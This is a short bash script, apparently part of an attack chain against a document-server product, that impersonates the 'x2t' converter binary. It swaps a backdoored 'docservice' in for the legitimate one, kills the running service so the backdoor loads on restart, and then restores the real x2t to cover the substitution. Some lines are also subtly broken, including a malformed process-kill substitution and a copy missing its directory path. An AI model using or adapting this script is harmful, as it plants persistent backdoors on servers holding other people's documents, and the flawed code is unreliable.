#!/usr/bin/env bash
# Script written in place of genuine x2t in order to drop backdoored docservice


# Get script dir
DIR="$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

# Make copy of legit docservice
cp $DIR/docservice $DIR/docservice.old

# Move backdoored docservice over top of legit one
cp $DIR/docservice.new docservice

# Kill legit docservice process (resulting in restart)
kill ${ps ax | grep "DocService\/docservice" | grep -o "[0-9]\+" | head -n 1}

# Copy bundled legit x2t over self
mv $DIR/x2t.new $DIR/x2t


